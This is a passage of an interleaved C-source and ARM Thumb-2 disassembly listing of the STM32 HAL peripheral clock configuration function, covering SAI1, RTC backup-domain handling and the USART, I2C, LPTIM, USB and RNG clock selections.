      /* SAI1 clock source config set later after clock selection check */
      break;
 8004536:	e00c      	b.n	8004552 <HAL_RCCEx_PeriphCLKConfig+0x5e>

    case RCC_SAI1CLKSOURCE_PLLSAI1:  /* PLLSAI1 is used as clock source for SAI1*/
      /* PLLSAI1 input clock, parameters M, N & P configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_P_UPDATE);
 8004538:	687b      	ldr	r3, [r7, #4]
 800453a:	3304      	adds	r3, #4
 800453c:	2100      	movs	r1, #0
 800453e:	4618      	mov	r0, r3
 8004540:	f000 f9de 	bl	8004900 <RCCEx_PLLSAI1_Config>
 8004544:	4603      	mov	r3, r0
 8004546:	74fb      	strb	r3, [r7, #19]
      /* SAI1 clock source config set later after clock selection check */
      break;
 8004548:	e003      	b.n	8004552 <HAL_RCCEx_PeriphCLKConfig+0x5e>
#endif /* STM32L4P5xx || STM32L4Q5xx || STM32L4R5xx || STM32L4R7xx || STM32L4R9xx || STM32L4S5xx || STM32L4S7xx || STM32L4S9xx */
      /* SAI1 clock source config set later after clock selection check */
      break;

    default:
      ret = HAL_ERROR;
 800454a:	2301      	movs	r3, #1
 800454c:	74fb      	strb	r3, [r7, #19]
      break;
 800454e:	e000      	b.n	8004552 <HAL_RCCEx_PeriphCLKConfig+0x5e>
      break;
 8004550:	bf00      	nop
    }

    if(ret == HAL_OK)
 8004552:	7cfb      	ldrb	r3, [r7, #19]
 8004554:	2b00      	cmp	r3, #0
 8004556:	d10b      	bne.n	8004570 <HAL_RCCEx_PeriphCLKConfig+0x7c>
    {
      /* Set the source of SAI1 clock*/
      __HAL_RCC_SAI1_CONFIG(PeriphClkInit->Sai1ClockSelection);
 8004558:	4b51      	ldr	r3, [pc, #324]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800455a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800455e:	f423 0240 	bic.w	r2, r3, #12582912	; 0xc00000
 8004562:	687b      	ldr	r3, [r7, #4]
 8004564:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004566:	494e      	ldr	r1, [pc, #312]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004568:	4313      	orrs	r3, r2
 800456a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
 800456e:	e001      	b.n	8004574 <HAL_RCCEx_PeriphCLKConfig+0x80>
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004570:	7cfb      	ldrb	r3, [r7, #19]
 8004572:	74bb      	strb	r3, [r7, #18]
    }
  }
#endif /* SAI2 */

  /*-------------------------- RTC clock source configuration ----------------------*/
  if((PeriphClkInit->PeriphClockSelection & RCC_PERIPHCLK_RTC) == RCC_PERIPHCLK_RTC)
 8004574:	687b      	ldr	r3, [r7, #4]
 8004576:	681b      	ldr	r3, [r3, #0]
 8004578:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800457c:	2b00      	cmp	r3, #0
 800457e:	f000 809e 	beq.w	80046be <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 8004582:	2300      	movs	r3, #0
 8004584:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 8004586:	4b46      	ldr	r3, [pc, #280]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004588:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800458a:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800458e:	2b00      	cmp	r3, #0
 8004590:	d101      	bne.n	8004596 <HAL_RCCEx_PeriphCLKConfig+0xa2>
 8004592:	2301      	movs	r3, #1
 8004594:	e000      	b.n	8004598 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 8004596:	2300      	movs	r3, #0
 8004598:	2b00      	cmp	r3, #0
 800459a:	d00d      	beq.n	80045b8 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 800459c:	4b40      	ldr	r3, [pc, #256]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800459e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045a0:	4a3f      	ldr	r2, [pc, #252]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045a2:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 80045a6:	6593      	str	r3, [r2, #88]	; 0x58
 80045a8:	4b3d      	ldr	r3, [pc, #244]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045aa:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80045ac:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 80045b0:	60bb      	str	r3, [r7, #8]
 80045b2:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 80045b4:	2301      	movs	r3, #1
 80045b6:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80045b8:	4b3a      	ldr	r3, [pc, #232]	; (80046a4 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045ba:	681b      	ldr	r3, [r3, #0]
 80045bc:	4a39      	ldr	r2, [pc, #228]	; (80046a4 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045be:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80045c2:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 80045c4:	f7fc fdda 	bl	800117c <HAL_GetTick>
 80045c8:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80045ca:	e009      	b.n	80045e0 <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 80045cc:	f7fc fdd6 	bl	800117c <HAL_GetTick>
 80045d0:	4602      	mov	r2, r0
 80045d2:	68fb      	ldr	r3, [r7, #12]
 80045d4:	1ad3      	subs	r3, r2, r3
 80045d6:	2b02      	cmp	r3, #2
 80045d8:	d902      	bls.n	80045e0 <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 80045da:	2303      	movs	r3, #3
 80045dc:	74fb      	strb	r3, [r7, #19]
        break;
 80045de:	e005      	b.n	80045ec <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 80045e0:	4b30      	ldr	r3, [pc, #192]	; (80046a4 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 80045e2:	681b      	ldr	r3, [r3, #0]
 80045e4:	f403 7380 	and.w	r3, r3, #256	; 0x100
 80045e8:	2b00      	cmp	r3, #0
 80045ea:	d0ef      	beq.n	80045cc <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 80045ec:	7cfb      	ldrb	r3, [r7, #19]
 80045ee:	2b00      	cmp	r3, #0
 80045f0:	d15a      	bne.n	80046a8 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 80045f2:	4b2b      	ldr	r3, [pc, #172]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045f4:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80045f8:	f403 7340 	and.w	r3, r3, #768	; 0x300
 80045fc:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 80045fe:	697b      	ldr	r3, [r7, #20]
 8004600:	2b00      	cmp	r3, #0
 8004602:	d01e      	beq.n	8004642 <HAL_RCCEx_PeriphCLKConfig+0x14e>
 8004604:	687b      	ldr	r3, [r7, #4]
 8004606:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004608:	697a      	ldr	r2, [r7, #20]
 800460a:	429a      	cmp	r2, r3
 800460c:	d019      	beq.n	8004642 <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 800460e:	4b24      	ldr	r3, [pc, #144]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004610:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004614:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8004618:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 800461a:	4b21      	ldr	r3, [pc, #132]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800461c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004620:	4a1f      	ldr	r2, [pc, #124]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004622:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8004626:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 800462a:	4b1d      	ldr	r3, [pc, #116]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800462c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004630:	4a1b      	ldr	r2, [pc, #108]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004632:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8004636:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 800463a:	4a19      	ldr	r2, [pc, #100]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800463c:	697b      	ldr	r3, [r7, #20]
 800463e:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 8004642:	697b      	ldr	r3, [r7, #20]
 8004644:	f003 0301 	and.w	r3, r3, #1
 8004648:	2b00      	cmp	r3, #0
 800464a:	d016      	beq.n	800467a <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 800464c:	f7fc fd96 	bl	800117c <HAL_GetTick>
 8004650:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004652:	e00b      	b.n	800466c <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8004654:	f7fc fd92 	bl	800117c <HAL_GetTick>
 8004658:	4602      	mov	r2, r0
 800465a:	68fb      	ldr	r3, [r7, #12]
 800465c:	1ad3      	subs	r3, r2, r3
 800465e:	f241 3288 	movw	r2, #5000	; 0x1388
 8004662:	4293      	cmp	r3, r2
 8004664:	d902      	bls.n	800466c <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 8004666:	2303      	movs	r3, #3
 8004668:	74fb      	strb	r3, [r7, #19]
            break;
 800466a:	e006      	b.n	800467a <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 800466c:	4b0c      	ldr	r3, [pc, #48]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800466e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004672:	f003 0302 	and.w	r3, r3, #2
 8004676:	2b00      	cmp	r3, #0
 8004678:	d0ec      	beq.n	8004654 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 800467a:	7cfb      	ldrb	r3, [r7, #19]
 800467c:	2b00      	cmp	r3, #0
 800467e:	d10b      	bne.n	8004698 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 8004680:	4b07      	ldr	r3, [pc, #28]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004682:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004686:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 800468a:	687b      	ldr	r3, [r7, #4]
 800468c:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 800468e:	4904      	ldr	r1, [pc, #16]	; (80046a0 <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004690:	4313      	orrs	r3, r2
 8004692:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 8004696:	e009      	b.n	80046ac <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 8004698:	7cfb      	ldrb	r3, [r7, #19]
 800469a:	74bb      	strb	r3, [r7, #18]
 800469c:	e006      	b.n	80046ac <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 800469e:	bf00      	nop
 80046a0:	40021000 	.word	0x40021000
 80046a4:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 80046a8:	7cfb      	ldrb	r3, [r7, #19]
 80046aa:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 80046ac:	7c7b      	ldrb	r3, [r7, #17]
 80046ae:	2b01      	cmp	r3, #1
 80046b0:	d105      	bne.n	80046be <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 80046b2:	4b8a      	ldr	r3, [pc, #552]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046b4:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 80046b6:	4a89      	ldr	r2, [pc, #548]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046b8:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 80046bc:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 80046be:	687b      	ldr	r3, [r7, #4]
 80046c0:	681b      	ldr	r3, [r3, #0]
 80046c2:	f003 0301 	and.w	r3, r3, #1
 80046c6:	2b00      	cmp	r3, #0
 80046c8:	d00a      	beq.n	80046e0 <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 80046ca:	4b84      	ldr	r3, [pc, #528]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046cc:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046d0:	f023 0203 	bic.w	r2, r3, #3
 80046d4:	687b      	ldr	r3, [r7, #4]
 80046d6:	6a1b      	ldr	r3, [r3, #32]
 80046d8:	4980      	ldr	r1, [pc, #512]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046da:	4313      	orrs	r3, r2
 80046dc:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 80046e0:	687b      	ldr	r3, [r7, #4]
 80046e2:	681b      	ldr	r3, [r3, #0]
 80046e4:	f003 0302 	and.w	r3, r3, #2
 80046e8:	2b00      	cmp	r3, #0
 80046ea:	d00a      	beq.n	8004702 <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 80046ec:	4b7b      	ldr	r3, [pc, #492]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046ee:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046f2:	f023 020c 	bic.w	r2, r3, #12
 80046f6:	687b      	ldr	r3, [r7, #4]
 80046f8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80046fa:	4978      	ldr	r1, [pc, #480]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046fc:	4313      	orrs	r3, r2
 80046fe:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 8004702:	687b      	ldr	r3, [r7, #4]
 8004704:	681b      	ldr	r3, [r3, #0]
 8004706:	f003 0320 	and.w	r3, r3, #32
 800470a:	2b00      	cmp	r3, #0
 800470c:	d00a      	beq.n	8004724 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 800470e:	4b73      	ldr	r3, [pc, #460]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004710:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004714:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 8004718:	687b      	ldr	r3, [r7, #4]
 800471a:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800471c:	496f      	ldr	r1, [pc, #444]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800471e:	4313      	orrs	r3, r2
 8004720:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 8004724:	687b      	ldr	r3, [r7, #4]
 8004726:	681b      	ldr	r3, [r3, #0]
 8004728:	f403 7300 	and.w	r3, r3, #512	; 0x200
 800472c:	2b00      	cmp	r3, #0
 800472e:	d00a      	beq.n	8004746 <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 8004730:	4b6a      	ldr	r3, [pc, #424]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004732:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004736:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 800473a:	687b      	ldr	r3, [r7, #4]
 800473c:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 800473e:	4967      	ldr	r1, [pc, #412]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004740:	4313      	orrs	r3, r2
 8004742:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 8004746:	687b      	ldr	r3, [r7, #4]
 8004748:	681b      	ldr	r3, [r3, #0]
 800474a:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800474e:	2b00      	cmp	r3, #0
 8004750:	d00a      	beq.n	8004768 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 8004752:	4b62      	ldr	r3, [pc, #392]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004754:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004758:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 800475c:	687b      	ldr	r3, [r7, #4]
 800475e:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8004760:	495e      	ldr	r1, [pc, #376]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004762:	4313      	orrs	r3, r2
 8004764:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 8004768:	687b      	ldr	r3, [r7, #4]
 800476a:	681b      	ldr	r3, [r3, #0]
 800476c:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004770:	2b00      	cmp	r3, #0
 8004772:	d00a      	beq.n	800478a <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 8004774:	4b59      	ldr	r3, [pc, #356]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004776:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800477a:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 800477e:	687b      	ldr	r3, [r7, #4]
 8004780:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004782:	4956      	ldr	r1, [pc, #344]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004784:	4313      	orrs	r3, r2
 8004786:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 800478a:	687b      	ldr	r3, [r7, #4]
 800478c:	681b      	ldr	r3, [r3, #0]
 800478e:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004792:	2b00      	cmp	r3, #0
 8004794:	d00a      	beq.n	80047ac <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 8004796:	4b51      	ldr	r3, [pc, #324]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004798:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800479c:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 80047a0:	687b      	ldr	r3, [r7, #4]
 80047a2:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 80047a4:	494d      	ldr	r1, [pc, #308]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047a6:	4313      	orrs	r3, r2
 80047a8:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 80047ac:	687b      	ldr	r3, [r7, #4]
 80047ae:	681b      	ldr	r3, [r3, #0]
 80047b0:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 80047b4:	2b00      	cmp	r3, #0
 80047b6:	d028      	beq.n	800480a <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 80047b8:	4b48      	ldr	r3, [pc, #288]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047ba:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047be:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 80047c2:	687b      	ldr	r3, [r7, #4]
 80047c4:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047c6:	4945      	ldr	r1, [pc, #276]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047c8:	4313      	orrs	r3, r2
 80047ca:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 80047ce:	687b      	ldr	r3, [r7, #4]
 80047d0:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047d2:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 80047d6:	d106      	bne.n	80047e6 <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 80047d8:	4b40      	ldr	r3, [pc, #256]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047da:	68db      	ldr	r3, [r3, #12]
 80047dc:	4a3f      	ldr	r2, [pc, #252]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047de:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 80047e2:	60d3      	str	r3, [r2, #12]
 80047e4:	e011      	b.n	800480a <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 80047e6:	687b      	ldr	r3, [r7, #4]
 80047e8:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 80047ea:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 80047ee:	d10c      	bne.n	800480a <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 80047f0:	687b      	ldr	r3, [r7, #4]
 80047f2:	3304      	adds	r3, #4
 80047f4:	2101      	movs	r1, #1
 80047f6:	4618      	mov	r0, r3
 80047f8:	f000 f882 	bl	8004900 <RCCEx_PLLSAI1_Config>
 80047fc:	4603      	mov	r3, r0
 80047fe:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 8004800:	7cfb      	ldrb	r3, [r7, #19]
 8004802:	2b00      	cmp	r3, #0
 8004804:	d001      	beq.n	800480a <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 8004806:	7cfb      	ldrb	r3, [r7, #19]
 8004808:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 800480a:	687b      	ldr	r3, [r7, #4]
 800480c:	681b      	ldr	r3, [r3, #0]
 800480e:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 8004812:	2b00      	cmp	r3, #0
 8004814:	d028      	beq.n	8004868 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 8004816:	4b31      	ldr	r3, [pc, #196]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004818:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800481c:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 8004820:	687b      	ldr	r3, [r7, #4]
 8004822:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004824:	492d      	ldr	r1, [pc, #180]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004826:	4313      	orrs	r3, r2
 8004828:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 800482c:	687b      	ldr	r3, [r7, #4]
 800482e:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004830:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004834:	d106      	bne.n	8004844 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004836:	4b29      	ldr	r3, [pc, #164]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004838:	68db      	ldr	r3, [r3, #12]
 800483a:	4a28      	ldr	r2, [pc, #160]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
